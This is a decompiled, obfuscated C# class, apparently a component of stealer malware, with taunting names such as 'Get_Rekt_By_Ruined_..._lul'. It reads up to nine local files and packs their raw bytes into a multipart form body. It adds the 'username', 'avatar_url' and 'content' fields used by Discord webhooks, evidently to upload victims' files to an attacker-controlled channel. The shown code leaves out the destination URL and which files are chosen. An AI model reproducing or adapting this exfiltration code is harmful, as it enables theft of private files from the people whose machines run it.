using System;
using System.IO;
using System.Net;
using System.Text;

// Token: 0x02000018 RID: 24
public class Get_Rekt_By_Ruined_BGha_lul : Get_Rekt_By_Ruined_fBeA_lul
{
	// Token: 0x06000094 RID: 148 RVA: 0x0000720C File Offset: 0x0000540C
	public Get_Rekt_By_Ruined_BGha_lul(string string_0 = null, string string_1 = null) : base(string_0, string_1)
	{
		this.Get_Rekt_By_Ruined_BECc_lul = "------------------------" + DateTime.Now.Ticks.ToString("x");
		base.Get_Rekt_By_Ruined_CCea_lul = "multipart/form-data; boundary=" + this.Get_Rekt_By_Ruined_BECc_lul;
		base.Get_Rekt_By_Ruined_hAEc_lul = Encoding.Default;
	}

	// Token: 0x06000095 RID: 149 RVA: 0x0000424B File Offset: 0x0000244B
	public void Get_Rekt_By_Ruined_CDCd_lul(string string_0)
	{
		this.Get_Rekt_By_Ruined_dbGa_lul = string_0;
	}

	// Token: 0x06000096 RID: 150 RVA: 0x00007284 File Offset: 0x00005484
	public void Get_Rekt_By_Ruined_hfcB_lul(string[] string_0)
	{
		WebClient webClient = new WebClient();
		webClient.Encoding = Encoding.Default;
		this.Get_Rekt_By_Ruined_EfEE_lul = "";
		int num = 0;
		while (num < 9 && num < string_0.Length)
		{
			FileInfo fileInfo = new FileInfo(string_0[num]);
			string str = string.Format("--{0}\r\nContent-Disposition: form-data; name=\"file\"; filename=\"{1}\"\r\nContent-Type: {2}\r\n\r\n{3}\r\n", new object[]
			{
				this.Get_Rekt_By_Ruined_BECc_lul,
				fileInfo.Name,
				"application/octet-stream",
				webClient.Encoding.GetString(File.ReadAllBytes(fileInfo.FullName))
			});
			this.Get_Rekt_By_Ruined_EfEE_lul += str;
			num++;
		}
	}

	// Token: 0x06000097 RID: 151 RVA: 0x00007324 File Offset: 0x00005524
	public override string Get_Rekt_By_Ruined_gdhG_lul()
	{
		this.Get_Rekt_By_Ruined_EfEE_lul += string.Format("--{0}\r\nContent-Disposition: form-data; name=\"{1}\"\r\n\r\n{2}\r\n", this.Get_Rekt_By_Ruined_BECc_lul, "username", base.Get_Rekt_By_Ruined_DAgB_lul);
		this.Get_Rekt_By_Ruined_EfEE_lul += string.Format("--{0}\r\nContent-Disposition: form-data; name=\"{1}\"\r\n\r\n{2}\r\n", this.Get_Rekt_By_Ruined_BECc_lul, "avatar_url", base.Get_Rekt_By_Ruined_chhA_lul);
		this.Get_Rekt_By_Ruined_EfEE_lul += string.Format("--{0}\r\nContent-Disposition: form-data; name=\"{1}\"\r\n\r\n{2}\r\n", this.Get_Rekt_By_Ruined_BECc_lul, "content", this.Get_Rekt_By_Ruined_dbGa_lul);
		this.Get_Rekt_By_Ruined_EfEE_lul += string.Format("--{0}--", this.Get_Rekt_By_Ruined_BECc_lul);
		return this.Get_Rekt_By_Ruined_EfEE_lul;
	}

	// Token: 0x04000053 RID: 83
	private string Get_Rekt_By_Ruined_BECc_lul;

	// Token: 0x04000054 RID: 84
	private string Get_Rekt_By_Ruined_dbGa_lul = "";

	// Token: 0x04000055 RID: 85
	private string Get_Rekt_By_Ruined_EfEE_lul = "";
}
